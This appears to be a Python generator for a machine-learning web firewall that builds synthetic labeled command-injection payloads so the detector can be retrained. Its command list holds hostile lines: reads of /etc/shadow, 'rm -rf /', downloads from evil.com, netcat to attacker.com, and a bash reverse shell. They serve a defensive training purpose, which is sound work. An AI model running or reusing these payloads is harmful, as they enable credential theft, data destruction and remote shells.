"""Synthetic raw command-injection payloads — targets the regression the
2026-07-31 commix retrain didn't fix.

The commix corpus (ml/waf/data/external via bifrost_cmdi_seclists.zip) is
100% percent-encoded (%3B, %7C, ...). After that retrain, real-looking raw
attacks like `cmd=ping 8.8.8.8 && cat /etc/shadow` started predicting
*clean* at 0.994 confidence — worse than before, since it's no longer even
flagged as a wrong-but-suspicious class. Root cause: the model had never
seen a `key=value`-shaped body (the exact surface form synth_benign.py's
forms also use) where the value is actually a raw shell operator + real
command, so it leaned on the form-like shape alone as a benign signal.

This generator produces exactly that shape: a form-style key (deliberately
overlapping with synth_benign's key vocabulary — host/ip/cmd/file/target/
name — so the model sees the SAME keys used both ways and has to key off
the operator+command, not the key name) followed by a raw operator and a
real command, labeled command_injection.

Usage:
    python -m ml.waf.synth_cmdi --count 4000 --seed 42
"""
from __future__ import annotations

import argparse
import json
import os
import random

_HERE = os.path.dirname(__file__)
EXTERNAL_DIR = os.path.join(_HERE, "data", "external")

# Overlaps deliberately with synth_benign.py's key vocabulary + common
# vulnerable-parameter names seen in real command-injection CVEs.
_KEYS = ["host", "ip", "cmd", "file", "target", "name", "input", "domain", "addr", "path", "url", "ping"]

_OPERATORS = [";", "&&", "||", "|"]

_COMMANDS = [
    "cat /etc/passwd", "cat /etc/shadow", "whoami", "id", "ls -la",
    "nc attacker.com 4444", "wget http://evil.com/x.sh", "curl http://evil.com/x",
    "rm -rf /", "ping -c 4 8.8.8.8", "uname -a",
    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
]

# Realistic "legit-looking" prefix values so the operator+command rides
# along after something that looks like a normal parameter value —
# matches how these attacks actually appear in the wild.
_PREFIX_VALUES = ["127.0.0.1", "8.8.8.8", "test.txt", "example.com", "report.pdf", "192.168.1.1", ""]


def _substitution_form(rng: random.Random, key: str, command: str) -> str:
    wrapper = rng.choice(["`{}`", "$({})"])
    return f"{key}={wrapper.format(command)}"


def _operator_form(rng: random.Random, key: str, command: str) -> str:
    prefix = rng.choice(_PREFIX_VALUES)
    op = rng.choice(_OPERATORS)
    sep = " " if rng.random() < 0.5 else ""
    value = f"{prefix}{sep}{op}{sep}{command}" if prefix else f"{op}{sep}{command}"
    return f"{key}={value}"


def _multi_param_form(rng: random.Random, key: str, command: str) -> str:
    # The exact regression shape: operator+command riding alongside a
    # second, wholly benign-looking field — mirrors real request bodies.
    base = _operator_form(rng, key, command)
    extra_key = rng.choice(["submit", "token", "page", "id"])
    extra_val = rng.choice(["true", "1", str(rng.randint(1, 99)), "abc123"])
    return f"{base}&{extra_key}={extra_val}"


_TEMPLATES = [_operator_form, _operator_form, _multi_param_form, _substitution_form]


def generate(count: int, seed: int = 42) -> list[dict]:
    """Deterministic (same seed -> same output) synthetic raw cmdi corpus."""
    rng = random.Random(seed)
    records = []
    for _ in range(count):
        key = rng.choice(_KEYS)
        command = rng.choice(_COMMANDS)
        template = rng.choice(_TEMPLATES)
        text = template(rng, key, command)
        records.append({"text": text, "label": "command_injection", "source": "synth_cmdi_raw"})
    return records


def main() -> None:
    ap = argparse.ArgumentParser(prog="ml.waf.synth_cmdi", description="Generate synthetic raw command-injection payloads")
    ap.add_argument("--count", type=int, default=4000)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default=os.path.join(EXTERNAL_DIR, "synth_cmdi_raw.jsonl"))
    args = ap.parse_args()

    records = generate(args.count, seed=args.seed)
    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    print(f"wrote {len(records)} synthetic raw command_injection records -> {args.out}")


if __name__ == "__main__":
    main()
